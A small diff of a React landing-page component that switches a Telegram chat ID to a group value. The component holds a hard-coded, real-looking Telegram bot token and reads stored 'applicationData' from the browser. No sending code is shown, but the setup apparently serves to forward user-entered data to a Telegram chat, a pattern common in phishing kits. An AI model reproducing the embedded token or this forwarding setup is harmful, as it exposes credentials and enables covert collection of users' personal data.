@@ -8,7 +8,7 @@ const LandingPage: React.FC = () => {
   const [showPopup, setShowPopup] = useState(false);
   const [countdown, setCountdown] = useState(100);
   const BOT_TOKEN = "7287693137:AAHB0QO7JC62ZJSw5EHhVxHF3EJnbqZcXHk";
-  const CHAT_ID = "4575071223";
+  const CHAT_ID = "-4575071223";
 
   const storedData = localStorage.getItem("applicationData");
   const parsedData = storedData ? JSON.parse(storedData) : {};
